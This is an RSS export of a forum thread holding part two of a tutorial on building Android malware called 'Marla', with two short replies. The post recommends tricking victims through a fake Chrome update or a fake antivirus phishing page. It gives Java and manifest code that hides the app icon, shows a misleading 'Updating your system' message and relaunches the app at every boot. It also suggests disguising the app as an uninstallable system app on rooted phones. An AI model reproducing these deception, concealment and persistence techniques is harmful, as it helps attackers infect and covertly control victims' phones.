<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Android Malware : A tumor called Marla 0x02</title>
    <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851</link>
    <description># A Tumor Called Marla
---

Hi everyone, today we will cover how to hide our malware from the user and run our malware as a service.
When the Malware run for the first time it will hide the app icon from the user laucher, and run a service. 
The service only query the OS version for the moment, we will be much more malicious in the next tutorial.


## How to infect user ?
---

When the user will install the malware, we want it to be  persistent. 
We need to force the user to install our malware and run it but how ?

### Social Engineering

Here is one of the way to force the user to download **Marla** 
Fake Chrome update ( Everyone use chrome on android, most of the user ) or a fake antivirus ( Phishing page telling the user get 10 virus. Trick him to download your &quot;Antivirus&quot; :wink: )

If you choose the Antivirus way, make an app that look like a legit antivirus.
When the user will download, install the app and run it. We are good :)

###  Why should we use these techniques ?

New version of android  need to be run once to be able to be started at boot time and use permission ( see [Android Malware](https://0x00sec.org/t/android-malware-start-the-app-at-boot-and-get-kernel-version-0x01/786) for more information about permission).

## Hiding app icon
Let&#39;s start to code and hide our app icon :) 

Today our task is to disable the app component of our application *here the icon*. (You can start from scratch or use the old code of the previous tutorial ). 

*n.b : The app won&#39;t be persistent If the user haven&#39;t his phone rooted. The user will be able to uninstall the malware however If the android phone is rooted we can hide the app as a system app and give a name like : com.android.update, he won&#39;t be able to uninstall system app*

Main Activity 
```java
package com.android.marla;

import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        PackageManager pm = this.getPackageManager();
        //The line below will hide your app icon
        pm.setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        //Just show a Toast
        Toast.makeText(this, &quot;Updating your system please wait ...&quot;, Toast.LENGTH_LONG);


    }
}



```
Here is what you should see
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/e76719336447356331cb7a3fb59052219fd03cb2.png&quot; width=&quot;322&quot; height=&quot;479&quot;&gt;

Now if you kill the app after a moment.
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/d0ff572134c98cd2e9764551f615be2f34a98514.png&quot; width=&quot;320&quot; height=&quot;478&quot;&gt;

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/1X/e3a0b552ec7d53861e2388c220a787f8665c5f6d.png&quot; width=&quot;321&quot; height=&quot;481&quot;&gt;

No Marla app :D 

## Run a service

We want a running service that can gather information. Let&#39;s make a new class

```java
package com.android.marla;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.support.annotation.Nullable;
import android.widget.Toast;

public class MainService extends Service{

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public void onCreate()
    {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable(){

            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),&quot;Malware started&quot;,Toast.LENGTH_LONG).show();
            }
        });
    }

}

```

Here I just create a Toast for PoC , here is the function

```java
 public void onCreate()
    {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable(){

            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),&quot;Malware started&quot;,Toast.LENGTH_LONG).show();
            }
        });
    }
```

In your android Manifest add the service 

```xml
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;
    package=&quot;com.android.marla&quot;&gt;
    &lt;!--PERMISSION--&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;/&gt;
    &lt;!--PERMISSION--&gt;
    &lt;application
        android:allowBackup=&quot;true&quot;
        android:icon=&quot;@mipmap/ic_launcher&quot;
        android:label=&quot;@string/app_name&quot;
        android:supportsRtl=&quot;true&quot;
        android:theme=&quot;@style/AppTheme&quot;&gt;
        &lt;activity android:name=&quot;.MainActivity&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;

                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        &lt;!-- THE SERVICE IS BELOW--&gt;
        &lt;service android:name=&quot;.MainService&quot;/&gt;
    &lt;/application&gt;

&lt;/manifest&gt;
```

Well done :) You&#39;ve created a service now let&#39;s run it at boot time. ( I hope you remember the previous tutorial for this part) 
Receiver :
```java
package com.android.marla;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        /** if the boot is completed **/
        if(Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())){
            /** Start the MainActivity.class everytime the phone boot**/
            Intent i = new Intent(context, MainActivity.class);
            context.startActivity(i);
        }
    }
}
```

Well done, your application is not malicious for the moment. Your app look like an adware for the moment.</description>
    
    <lastBuildDate>Fri, 29 Jul 2016 13:50:06 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Android Malware : A tumor called Marla 0x02</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851/3</link>
        <pubDate>Sun, 21 Jan 2018 00:42:20 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-851-3</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851.rss">Android Malware : A tumor called Marla 0x02</source>
      </item>
      <item>
        <title>Android Malware : A tumor called Marla 0x02</title>
        <dc:creator><![CDATA[afiskon]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for an article! Well done!</p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851/2</link>
        <pubDate>Fri, 29 Jul 2016 13:50:06 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-851-2</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851.rss">Android Malware : A tumor called Marla 0x02</source>
      </item>
      <item>
        <title>Android Malware : A tumor called Marla 0x02</title>
        <dc:creator><![CDATA[L3akM3-0day]]></dc:creator>
        <description><![CDATA[
            <h1>A Tumor Called Marla</h1>
<hr>
<p>Hi everyone, today we will cover how to hide our malware from the user and run our malware as a service.<br>
When the Malware run for the first time it will hide the app icon from the user laucher, and run a service.<br>
The service only query the OS version for the moment, we will be much more malicious in the next tutorial.</p>
<h2>How to infect user ?</h2>
<hr>
<p>When the user will install the malware, we want it to be  persistent.<br>
We need to force the user to install our malware and run it but how ?</p>
<h3>Social Engineering</h3>
<p>Here is one of the way to force the user to download <strong>Marla</strong><br>
Fake Chrome update ( Everyone use chrome on android, most of the user ) or a fake antivirus ( Phishing page telling the user get 10 virus. Trick him to download your “Antivirus” <img src="/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> )</p>
<p>If you choose the Antivirus way, make an app that look like a legit antivirus.<br>
When the user will download, install the app and run it. We are good <img src="/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<h3>Why should we use these techniques ?</h3>
<p>New version of android  need to be run once to be able to be started at boot time and use permission ( see <a href="https://0x00sec.org/t/android-malware-start-the-app-at-boot-and-get-kernel-version-0x01/786">Android Malware</a> for more information about permission).</p>
<h2>Hiding app icon</h2>
<p>Let’s start to code and hide our app icon <img src="/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Today our task is to disable the app component of our application <em>here the icon</em>. (You can start from scratch or use the old code of the previous tutorial ).</p>
<p><em>n.b : The app won’t be persistent If the user haven’t his phone rooted. The user will be able to uninstall the malware however If the android phone is rooted we can hide the app as a system app and give a name like : com.android.update, he won’t be able to uninstall system app</em></p>
<p>Main Activity</p>
<pre><code class="lang-java">package com.android.marla;

import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        PackageManager pm = this.getPackageManager();
        //The line below will hide your app icon
        pm.setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        //Just show a Toast
        Toast.makeText(this, "Updating your system please wait ...", Toast.LENGTH_LONG);


    }
}



</code></pre>
<p>Here is what you should see<br>
<img src="//0x00sec.s3.amazonaws.com/original/1X/e76719336447356331cb7a3fb59052219fd03cb2.png" width="322" height="479"></p>
<p>Now if you kill the app after a moment.<br>
<img src="//0x00sec.s3.amazonaws.com/original/1X/d0ff572134c98cd2e9764551f615be2f34a98514.png" width="320" height="478"></p>
<p><img src="//0x00sec.s3.amazonaws.com/original/1X/e3a0b552ec7d53861e2388c220a787f8665c5f6d.png" width="321" height="481"></p>
<p>No Marla app <img src="/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<h2>Run a service</h2>
<p>We want a running service that can gather information. Let’s make a new class</p>
<pre><code class="lang-java">package com.android.marla;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.support.annotation.Nullable;
import android.widget.Toast;

public class MainService extends Service{

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public void onCreate()
    {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable(){

            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),"Malware started",Toast.LENGTH_LONG).show();
            }
        });
    }

}

</code></pre>
<p>Here I just create a Toast for PoC , here is the function</p>
<pre><code class="lang-java"> public void onCreate()
    {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable(){

            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),"Malware started",Toast.LENGTH_LONG).show();
            }
        });
    }
</code></pre>
<p>In your android Manifest add the service</p>
<pre><code class="lang-xml">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.android.marla"&gt;
    &lt;!--PERMISSION--&gt;
    &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/&gt;
    &lt;!--PERMISSION--&gt;
    &lt;application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme"&gt;
        &lt;activity android:name=".MainActivity"&gt;
            &lt;intent-filter&gt;
                &lt;action android:name="android.intent.action.MAIN" /&gt;

                &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        &lt;!-- THE SERVICE IS BELOW--&gt;
        &lt;service android:name=".MainService"/&gt;
    &lt;/application&gt;

&lt;/manifest&gt;
</code></pre>
<p>Well done <img src="/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> You’ve created a service now let’s run it at boot time. ( I hope you remember the previous tutorial for this part)<br>
Receiver :</p>
<pre><code class="lang-java">package com.android.marla;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        /** if the boot is completed **/
        if(Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())){
            /** Start the MainActivity.class everytime the phone boot**/
            Intent i = new Intent(context, MainActivity.class);
            context.startActivity(i);
        }
    }
}
</code></pre>
<p>Well done, your application is not malicious for the moment. Your app look like an adware for the moment.</p>
          <p><a href="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851/1</link>
        <pubDate>Fri, 29 Jul 2016 13:42:29 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-851-1</guid>
        <source url="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851.rss">Android Malware : A tumor called Marla 0x02</source>
      </item>
  </channel>
</rss>
